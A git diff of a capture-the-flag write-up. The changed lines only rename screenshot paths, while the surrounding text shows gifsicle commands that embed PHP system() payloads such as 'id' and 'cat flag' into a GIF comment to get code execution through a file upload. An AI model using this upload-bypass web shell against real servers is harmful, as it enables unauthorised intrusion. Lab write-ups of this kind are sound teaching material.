@@ -53,7 +53,7 @@ error_reporting(E_ALL);
 * Firstly, we convert png file that we received from chall to gif file
 * I have tried change file extension from png to gif but it doesn't work, of course.
 
-![](<../.gitbook/assets/image (3).png>)
+![](<../.gitbook/assets/image (3) (3).png>)
 
 * I convert by [online tool](https://cloudconvert.com/png-to-gif) and ... that works. After we that just use this command:
 
@@ -67,7 +67,7 @@ gifsicle < frame-1.gif --comment "<?php system('id'); ?>" > output.php.gif
 
 Go to that path and get some interesting things:
 
-![](../.gitbook/assets/image.png)
+![](<../.gitbook/assets/image (1).png>)
 
 * It works, try other commands to rce :
 
@@ -83,7 +83,7 @@ gifsicle < frame-1.gif --comment "<?php system('ls /'); ?>" > output.php.gif
 gifsicle < frame-1.gif --comment "<?php system('cd / && cat flag'); ?>" > output.php.gif
 ```
 
-![](<../.gitbook/assets/image (2).png>)
+![](<../.gitbook/assets/image (2) (1).png>)
 
 flag in some confusing thing like this:
 
